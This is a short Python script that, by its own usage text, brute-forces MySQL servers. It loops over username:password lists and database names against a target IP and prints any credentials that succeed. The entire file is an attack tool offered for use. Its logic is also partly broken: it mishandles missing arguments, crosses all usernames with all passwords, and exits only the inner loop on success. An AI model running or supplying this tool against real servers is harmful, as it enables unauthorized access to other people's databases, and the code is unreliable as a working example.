import mysql.connector as mysql
import sys
import ipaddress

def connection(ip, uname, pword, db):
    try:
        mydb = mysql.connect(
            host=ip,
            user=uname,
            password=pword,
            database=db
        )
    except:
        return False
    else:
        return True

global file, file2
unames = []
pwords = []
dbase = []
IP = ""

if sys.argv[0] is None:
    print("""
    
    A tool for BruteForcing MySQL servers if there is an open port and an allowed remote connection. 
    
    Usage:
    
    Python3 BruteMysql.py <Colon Separated User and Password combo file)> <Database names list> <IP>
    
    # If intended to try on a single database name, just write the database name in the placeholder OR
    Leave it blank and the program will work on some common database names by default.
    
    """)

if sys.argv[1] is not None and str(sys.argv[1]).rsplit(".", 1).pop() == "txt":
    csv = sys.argv[1]
    try:
        file = open(csv, "rt")
    except:
        print("Illegal Colon SV format!")

if sys.argv[2] is not None and str(sys.argv[2]).rsplit(".", 1).pop() == "txt":
    csv2 = sys.argv[2]
    try:
        file2 = open(csv2, "rt")
    except:
        print("Illegal CSV format!")

elif sys.argv[2] is not None and type(sys.argv[2]) == str and sys.argv[2] != "default":
    dbase = [sys.argv[2]]
else:
    dbase = ["mysql", "information_schema", "performance_schema", "sys", ""]

if sys.argv[3] is not None and type(sys.argv[3]) == str:
    try:
        IP = ipaddress.IPv4Address(sys.argv[3])
        if IP:
            IP = str(IP)
    except:
        print("Illegal IP format")

for i in file2.readlines():
    dbase.append(i.strip("\n"))

for i in file.readlines():
    stripN = (i.strip("\n"))
    unames.append(stripN.split(":")[0])
    pwords.append(stripN.split(":")[1])

for db in dbase:
    for name in unames:
        for pwd in pwords:
            status = connection(ip=IP, db=db, uname=name, pword=pwd)
            if status is True:
                print("Connection Succeeded with -> "+"UserName: ", name, " Password: ", pwd, " DB: ", db)
                break
            else:
                print("Trying with -> "+"UserName: ", name, " Password: ", pwd, " DB: ", db)
                continue


